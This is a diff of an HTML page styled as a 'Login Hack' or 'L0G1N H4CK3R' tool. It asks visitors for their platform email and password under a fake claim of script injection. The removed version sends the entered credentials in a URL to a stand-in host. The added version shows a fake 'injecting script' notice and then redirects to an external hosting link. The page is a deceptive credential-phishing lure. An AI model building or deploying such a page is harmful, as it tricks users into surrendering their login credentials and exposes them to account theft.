@@ -1,183 +1,100 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>L0G1N H4CK3R</title>
-    <link
-      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap"
-      rel="stylesheet"
-    />
+<html lang="en">
+<head>
+	<title>Hack</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->	
+	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/util.css">
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+<!--===============================================================================================-->
+</head>
+<body>
+	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+				<form class="login100-form validate-form" id="login-form">
+					<span class="login100-form-title p-b-26">
+						Login Hack
+					</span>
+					<div class="wrap-input100 validate-input" data-validate = "Valid email is: a@b.c">
+						<input class="input100" type="text" name="email" required>
+						<span class="focus-input100" data-placeholder="Email"></span>
+					</div>
 
-    <style>
-      body,
-      html {
-        height: 100%;
-        margin: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-family: "Montserrat", sans-serif;
-        background-image: url("images/matrix.gif");
-        background-size: cover;
-        background-repeat: no-repeat;
-        background-position: center;
-      }
-      .container {
-        background-color: #000000;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        text-align: center;
-      }
-      form {
-        color: white;
-      }
-      .form-group {
-        margin-bottom: 15px;
-        color: white;
-      }
-      .form-group label {
-        display: block;
-        margin-bottom: 5px;
-        color: #00ff62;
-        font-weight: bold;
-      }
-      .form-group input {
-        width: 100%;
-        padding: 8px;
-        box-sizing: border-box;
-        border-radius: 10px;
-        border-color: #00ff62;
-      }
-      .form-group button {
-        width: 100%;
-        padding: 10px;
-        background-color: #00ff62;
-        color: rgb(0, 0, 0);
-        border: none;
-        cursor: pointer;
-      }
-      .form-group button:hover {
-        background-color: #baffbe;
-      }
-      .notification {
-        display: none;
-        margin-top: 20px;
-        padding: 10px;
-        background-color: #ffbb00;
-        color: white;
-        border-radius: 5px;
-      }
-      .glitch-wrapper {
-        width: 100%;
-        height: 100%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        background-color: #000000;
-      }
+					<div class="wrap-input100 validate-input" data-validate="Enter password">
+						<span class="btn-show-pass">
+							<i class="zmdi zmdi-eye"></i>
+						</span>
+						<input class="input100" type="password" name="pass" required>
+						<span class="focus-input100" data-placeholder="Senha"></span>
+					</div>
 
-      .glitch {
-        position: relative;
-        font-size: 40px;
-        font-weight: bold;
-        color: #ffffff;
-        letter-spacing: 3px;
-        z-index: 1;
-      }
+					<div class="container-login100-form-btn">
+						<div class="wrap-login100-form-btn">
+							<div class="login100-form-bgbtn"></div>
+							<button type="button" class="login100-form-btn" onclick="hackLogin()">
+								Hacker Login
+							</button>
+						</div>
+					</div>
+				</form>
+				<div id="message" style="display: none; text-align: center; margin-top: 20px;">
+					Injetando script e redirecionando...
+				</div>
+			</div>
+		</div>
+	</div>
+	
 
-      .glitch:before,
-      .glitch:after {
-        display: block;
-        content: attr(data-text);
-        position: absolute;
-        top: 0;
-        left: 0;
-        opacity: 0.8;
-      }
+	<div id="dropDownSelect1"></div>
+	
+<!--===============================================================================================-->
+	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/animsition/js/animsition.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/bootstrap/js/popper.js"></script>
+	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/select2/select2.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/daterangepicker/moment.min.js"></script>
+	<script src="vendor/daterangepicker/daterangepicker.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/countdowntime/countdowntime.js"></script>
+<!--===============================================================================================-->
+	<script src="js/main.js"></script>
+	<script>
+		function hackLogin() {
+			// Mostrar mensagem de sucesso
+			document.getElementById('message').style.display = 'block';
+			
+			// Após 5 segundos, redirecionar para outra página
+			setTimeout(function() {
+				window.location.href = 'https://hosting.devluar.com/entraai/SWBGyCTn'; // Altere para a URL desejada
+			}, 5000);
+		}
+	</script>
 
-      .glitch:before {
-        animation: glitch-it 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) both
-          infinite;
-        color: #11ff09;
-        z-index: -1;
-      }
-
-      .glitch:after {
-        animation: glitch-it 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) reverse
-          both infinite;
-        color: #ff8a04;
-        z-index: -2;
-      }
-
-      @keyframes glitch-it {
-        0% {
-          transform: translate(0);
-        }
-        20% {
-          transform: translate(-2px, 2px);
-        }
-        40% {
-          transform: translate(-2px, -2px);
-        }
-        60% {
-          transform: translate(2px, 2px);
-        }
-        80% {
-          transform: translate(2px, -2px);
-        }
-        to {
-          transform: translate(0);
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <form id="loginForm">
-        <div class="glitch-wrapper">
-          <div class="glitch" data-text="L0G1N H4CK3R">L0G1N H4CK3R</div>
-        </div>
-        <small>Insira seus dados de login da plataforma</small>
-        <br />
-        <br />
-        <div class="form-group">
-          <label for="email">Email:</label>
-          <input type="email" id="email" name="email" required />
-        </div>
-        <div class="form-group">
-          <label for="password">Senha:</label>
-          <input type="password" id="password" name="password" required />
-        </div>
-        <div class="form-group">
-          <button type="submit">Confirmar</button>
-        </div>
-      </form>
-      <div class="notification" id="notification">
-        <b>
-          SCRIPT INJETADO NO SEU LOGIN, REDIRECIONANDO PARA A PLATAFORMA...</b
-        >
-      </div>
-    </div>
-    <script>
-      document
-        .getElementById("loginForm")
-        .addEventListener("submit", function (event) {
-          event.preventDefault();
-
-          var notification = document.getElementById("notification");
-          notification.style.display = "block";
-
-          const email = document.getElementById("email").value;
-          const password = document.getElementById("password").value;
-
-          setTimeout(function () {
-            window.location.href =
-              `https://example.com` + `&email=${email}&password=${password}`;
-          }, 8000);
-        });
-    </script>
-  </body>
+</body>
 </html>
